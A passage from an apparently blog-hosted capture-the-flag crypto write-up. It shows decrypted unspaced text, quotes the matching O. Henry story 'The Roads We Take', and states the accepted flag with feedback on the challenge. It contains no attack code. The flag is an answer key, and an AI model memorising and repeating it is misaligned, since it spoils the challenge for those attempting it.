AGAINALMOSTPATHETICALLYSAMEHEREAGREEDBOBHEWASSUREAFIRSTRATEKINDOFACROWBAITBUTBOLIVARHELLPULLUSTHROUGHALLRIGHTRECKONWEDBETTERBEMOVINONHADNTWESHARKILLBAGTHISBOODLEAGINANDWELLHITTHETRAILFORHIGHERTIMBERBOBTIDBALLREPLACEDTHESPOILINTHEBAGANDTIEDTHEMOUTHOFITTIGHTLYWITHACORDWHENHELOOKEDUPTHEMOSTPROMINENTOBJECTTHATHESAWWASTHEMUZZLEOFSHARKDODSONS45HELDUPONHIMWITHOUTAWAVERSTOPYOURFUNNINSAIDBOBWITHAGRINWEGOTTOBEHITTINTHEBREEZESETSTILLSAIDSHARKYOUAINTGOINTOHITNOBREEZEBOBIHATETOTELLYOUBUTTHEREAINTANYCHANCEFORBUTONEOFUSBOLIVARHESPLENTYTIREDANDHECANTCARRYDOUBLEWEBEENPARDSMEANDYOUSHARKDODSONFORTHREEYEARBOBSAIDQUIETLYWEVERISKEDOURLIVESTOGETHERTIMEANDAGAINIVEALWAYSGIVEYOUASQUAREDEALANDITHOUGHTYOUWASAMANIVEHEARDSOMEQUEERSTORIESABOUTYOUSHOOTINONEORTWOMENINAPECULIARWAYBUTINEVERBELIEVEDEMNOWIFYOUREJUSTHAVINALITTLEFUNWITHMESHARKPUTYOURGUNUPANDWELLGETONBOLIVARANDVAMOSEIFYOUMEANTOSHOOTSHOOTYOUBLACKHEARTEDSONOFATARANTULASHARKDODSONSFACEBOREADEEPLYSORROWFULLOOKYOUDONTKNOWHOWBADIFEELHESIGHEDABOUTTHATSORRELOFYOURNBREAKINHISLEGBOBTHEEXPRESSIONONDODSONSFACECHANGEDINANINSTANTTOONEOFCOLDFEROCITYMINGLEDWITHINEXORABLECUPIDITYTHESOULOFTHEMANSHOWEDITSELFFORAMOMENTLIKEANEVILFACEINTHEWINDOWOFAREPUTABLEHOUSETRULYBOBTIDBALLWASNEVERTOHITTHEBREEZEAGAINTHEDEADLY45OFTHEFALSEFRIENDCRACKEDANDFILLEDTHEGORGEWITHAROARTHATTHEWALLSHURLEDBACKWITHINDIGNANTECHOESANDBOLIVARUNCONSCIOUSACCOMPLICESWIFTLYBOREAWAYTHELASTOFTHEHOLDERSUPOFTHESUNSETEXPRESSNOTPUTTOTHESTRESSOFCARRYINGDOUBLEBUTASSHARKDODSONGALLOPEDAWAYTHEWOODSSEEMEDTOFADEFROMHISVIEWTHEREVOLVERINHISRIGHTHANDTURNEDTOTHECURVEDARMOFAMAHOGANYCHAIRHISSADDLEWASSTRANGELYUPHOLSTEREDANDHEOPENEDHISEYESANDSAWHISFEETNOTINSTIRRUPSBUTRESTINGQUIETLYONTHEEDGEOFAQUARTEREDOAKDESKIAMTELLINGYOUTHATDODSONOFTHEFIRMOFDODSONDECKERWALLSTREETBROKERSOPENEDHISEYESPEABODYTHECONFIDENTIALCLERKWASSTANDINGBYHISCHAIRHESITATINGTOSPEAKTHEREWASACONFUSEDHUMOFWHEELSBELOWANDTHESEDATIVEBUZZOFANELECTRICFANAHEMPEABODYSAIDDODSONBLINKINGIMUSTHAVEFALLENASLEEPIHADAMOSTREMARKABLEDREAMWHATISITPEABODYMRWILLIAMSSIROFTRACYWILLIAMSISOUTSIDEHEHASCOMETOSETTLEHISDEALINXYZTHEMARKETCAUGHTHIMSHORTSIRIFYOUREMEMBERYESIREMEMBERWHATISXYZQUOTEDATTODAYPEABODYONEEIGHTYFIVESIRTHENTHATSHISPRICEEXCUSEMESAIDPEABODYRATHERNERVOUSLYFORSPEAKINGOFITBUTIVEBEENTALKINGTOWILLIAMSHESANOLDFRIENDOFYOURSMRDODSONANDYOUPRACTICALLYHAVEACORNERINXYZITHOUGHTYOUMIGHTTHATISITHOUGHTYOUMIGHTNOTREMEMBERTHATHESOLDYOUTHESTOCKAT98IFHESETTLESATTHEMARKETPRICEITWILLTAKEEVERYCENTHEHASINTHEWORLDANDHISHOMETOOTODELIVERTHESHARESTHEEXPRESSIONONDODSONSFACECHANGEDINANINSTANTTOONEOFCOLDFEROCITYMINGLEDWITHINEXORABLECUPIDITYTHESOULOFTHEMANSHOWEDITSELFFORAMOMENTLIKEANEVILFACEINTHEWINDOWOFAREPUTABLEHOUSEHEWILLSETTLEATONEEIGHTYFIVESAIDDODSONBOLIVARCANNOTCARRYDOUBLE</div></pre></td></tr></table></figure>
<p><code>BOLIVAR</code> is not the flag. Let’s quickly look over the text, but we don’t want to spend too much time adding, so we fount the <a href="http://www.dominiopublico.gov.br/download/texto/gu001595.pdf" target="_blank" rel="external">original text</a> (Whirligigs, O. Henry, Chapter XIV,<br>THE ROADS WE TAKE, page 82).</p>
<p>Because HTML is better than PDF (<a href="http://www.hymnsandcarolsofchristmas.com/Text/8whrl11h.htm#14" target="_blank" rel="external">http://www.hymnsandcarolsofchristmas.com/Text/8whrl11h.htm#14</a>):</p>
<blockquote>
<p>TWENTY miles West of Tucson, the “Sunset Express” stopped at a tank to take on water. Besides the aqueous, addition the engine of that famous flyer acquired some other things that were not good for it.</p>
<p>While the fireman was lowering the feeding hose, Bob Tidball, “Shark” Dodson and a quarter-bred Creek Indian called John Big Dog climbed on the engine and showed the engineer three round orifices in pieces of ordnance that the carried. These orifices so impressed the engineer with their possibilities that he raised both hands in a gesture such as accompanies the ejaculation “Do tell!”</p>
<p>At the crisp command of Shark Dodson, who was leader of the attacking force the engineer descended to the ground and uncoupled the engine and tender. Then John Big Dog, perched upon the coal, sportively held two guns upon the engine driver and the fireman, and suggested that they run the engine fifty yards away and there await further orders.</p>
<p>Shark Dodson and Bob Tidball, scorning to put such low-grade ore as the passengers through the mill, struck out for the rich pocket of the express car. They found the messenger serene in the belief that the “Sunset Express” was taking on nothing more stimulating and dangerous than aqua pura. While Bob was knocking this idea out of his head with the butt-end of his six-shooter Shark Dodson was already dosing the express-car safe with dynamite.</p>
<p>The safe exploded to the tune of $30,000, all gold and currency. The passengers thrust their heads casually out of the windows to look for the thunder-cloud. The conductor jerked at the bell-rope, which sagged down loose and unresisting, at his tug. Shark Dodson and Bob Tidball, with their booty in a stout canvas bag, tumbled out of the express car and ran awkwardly in their high-heeled boots to the engine.</p>
<p>The engineer, sullenly angry but wise, ran the engine, according to orders, rapidly away from the inert train. But before this was accomplished the express messenger, recovered from Bob Tidball’s persuader to neutrality, jumped out of his car with a Winchester rifle and took a trick in the game. Mr. John Big Dog, sitting on the coal tender, unwittingly made a wrong lead by giving an imitation of a target, and the messenger trumped him. With a ball exactly between his shoulder blades the Creek chevalier of industry rolled off to the ground, thus increasing the share of his comrades in the loot by one-sixth each.</p>
<p>Two miles from the tank the engineer was ordered to stop.</p>
<p>The robbers waved a defiant adieu and plunged down the steep slope into the thick woods that lined the track. Five minutes of crashing through a thicket of chapparal brought them to open woods, where three horses were tied to low-hanging branches. One was waiting for John Big Dog, who would never ride by night or day again. This animal the robbers divested of saddle and bridle and set free. They mounted the other two with the bag across one pommel, and rode fast and with discre- tion through the forest and up a primeval, lonely gorge. Here the animal that bore Bob Tidball slipped on a mossy boulder and broke a foreleg. They shot him through the head at once and sat down to hold a council of flight. Made secure for the present by the tortuous trail they- had travelled, the question of time was no longer so big. Many miles and hours lay between them and the spryest posse that could follow. Shark Dodson’s horse, with trailing rope and dropped bridle, panted and cropped thankfully of the grass along the stream in the gorge. Bob Tidball opened the sack, drew out double handfuls of the neat packages of currency and the one sack of gold and chuckled with the glee of a child.</p>
<p>“Say, you old double-decked pirate,” he called joyfully to Dodson, “you said we could do it – you got a head for financing that knocks the horns off of anything in Arizona.”</p>
<p>“What are we going to do about a hoss for you, Bob? We ain’t got long to wait here. They’ll be on our trail before daylight in the mornin’.”</p>
<p>“Oh, I guess that cayuse of yourn’ll carry double for a while,” answered the sanguine Bob. “We’ll annex the first animal we come across. By jingoes, we made a haul, didn’t we? Accordin’ to the marks on this money there’s $30,000 – $15,000 apiece!”</p>
<p>“It’s short of what I expected,” said Shark Dodson, kicking softly at the packages with the toe of his boot and then he looked pensively at the wet sides of his tired horse.</p>
<p>“Old Bolivar’s mighty nigh played out,” he said, slowly. “I wish that sorrel of yours hadn’t got hurt.”</p>
<p>“So do I,” said Bob, heartily, “but it can’t be helped. Bolivar’s got plenty of bottom – he’ll get us both far enough to get fresh mounts. Dang it, Shark, I can’t belp thinkin’ how funny it is that an Easterner like you can come out here and give us Western fellows cards and spades in the desperado business. What part of the East was you from, anyway?”</p>
<p>“New York State,” said Shark Dodson, sitting down on a boulder and chewing a twig. “I was born on a farm in Ulster County. I ran away from home when I was seventeen. It was an accident my coming West. I was walkin’ along the road with my clothes in a bundle, makin’ for New York City. I had an idea of goin’ there and makin’ lots of money. I always felt like I could do it. I came to a place one evenin’ where the road forked and I didn’t know which fork to take. I studied about it for half an hour, and then I took the left- hand. That night I run into the camp of a Wild West show that was travellin’ among the little towns, and I went West with it. I’ve often wondered if I wouldn’t have turned out different if I’d took the other road.”</p>
<p>“Oh, I reckon you’d have ended up about the same,” said Bob Tidball, cheerfully philosophical. “It ain’t the roads we take; it’s what’s inside of us that makes us turn out the way we do.”</p>
<p>Shark Dodson got up and leaned against a tree.</p>
<p>“I’d a good deal rather that sorrel of yourn hadn’t hurt himself, Bob,” he said again, almost pathetically.</p>
<p>“Same here,” agreed Bob; “he was sure a first-rate kind of a crowbait. But Bolivar, he’ll pull us through all right. Reckon we’d better be movin’ on, hadn’t we, Shark? I’ll bag this boodle ag’in and we’ll hit the trail for higher timber.”</p>
<p>Bob Tidball replaced the spoil in the bag and tied the mouth of it tightly with a cord. When he looked up the most prominent object that he saw was the muzzle of Shark Dodson’s .45 held upon him without a waver.</p>
<p>“Stop your funnin’,” said Bob, with a grin. “We got to be hittin’ the breeze.”</p>
<p>“Set still,” said Shark. “You ain’t goin’ to hit no breeze, Bob. I hate to tell you, but there ain’t any chance for but one of us. Bolivar, he’s plenty tired, and he can’t carry double.”</p>
<p>“We been pards, me and you, Shark Dodson, for three year,” Bob said quietly. “We’ve risked our lives together time and again. I’ve always give you a square deal, and I thought you was a man. I’ve heard some queer stories about you shootin’ one or two men in a peculiar way, but I never believed ‘em. Now if you’re just havin’ a little fun with me, Shark, put your gun up, and we’ll get on Bolivar and vamose. If you mean to shoot – shoot, you blackhearted son of a tarantula!”</p>
<p>Shark Dodson’s face bore a deeply sorrowful look. “You don’t know how bad I feel,” he sighed, “about that sorrel of yourn breakin’ his leg, Bob.”</p>
<p>The expression on Dodson’s face changed in an instant to one of cold ferocity mingled with inexorable cupidity. The soul of the man showed itself for a moment like an evil face in the window of a reputable house.</p>
<p>Truly Bob Tidball was never to “hit the breeze” again. The deadly .45 of the false friend cracked and filled the gorge with a roar that the walls hurled back with indignant echoes. And Bolivar, unconscious accomplice, swiftly bore away the last of the holders-up of the “Sunset Express,” not put to the stress of “carrying double.”</p>
<p>But as “Shark” Dodson galloped away the woods seemed to fade from his view; the revolver in his right hand turned to the curved arm of a mahogany chair; his saddle was strangely upholstered, and he opened his eyes and saw his feet, not in stirrups, but resting quietly on the edge of a quartered-oak desk.</p>
<p>I am telling you that Dodson, of the firm of Dodson &amp; Decker, Wall Street brokers, opened his eyes. Peabody, the confidential clerk, was standing by his chair, hesitating to speak. There was a confused hum of wheels below, and the sedative buzz of an electric fan.</p>
<p>“Ahem! Peabody,” said Dodson, blinking. “I must have fallen asleep. I had a most remarkable dream. What is it, Peabody?”</p>
<p>“Mr. Williams, sir, of Tracy &amp; Williams, is outside. He has come to settle his deal in X. Y. Z. The market caught him short, sir, if you remember.”</p>
<p>“Yes, I remember. What is X. Y. Z. quoted at to-day, Peabody?”</p>
<p>“One eighty-five, sir.”</p>
<p>“Then that’s his price.”</p>
<p>“Excuse me,” said Peabody, rather nervously “for speaking of it, but I’ve been talking to Williams. He’s an old friend of yours, Mr. Dodson, and you practically have a corner in X. Y. Z. I thought you might – that is, I thought you might not remember that he sold you the stock at 98. If he settles at the market price it will take every cent he has in the world and his home too to deliver the shares.”</p>
<p>The expression on Dodson’s face changed in an instant to one of cold ferocity mingled with inexorable cupidity. The soul of the man showed itself for a moment like an evil face in the window of a reputable house.</p>
<p>“He will settle at one eighty-five,” said Dodson. “Bolivar cannot carry double.”</p>
</blockquote>
<p>Description said the end was very important so we tried <code>BOLIVARCANNOTCARRYDOUBLE</code> as flag. And that was the one.</p>
<p><strong>Feedback</strong>: no flag format, flag are meaningless so it may be hard to know when you get the flag or not, they need to use a flag format or give in the description what the flag have to look like, here we just known that was at the end</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="crypto" scheme="http://rawsec.ml/tags/crypto/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
</feed>
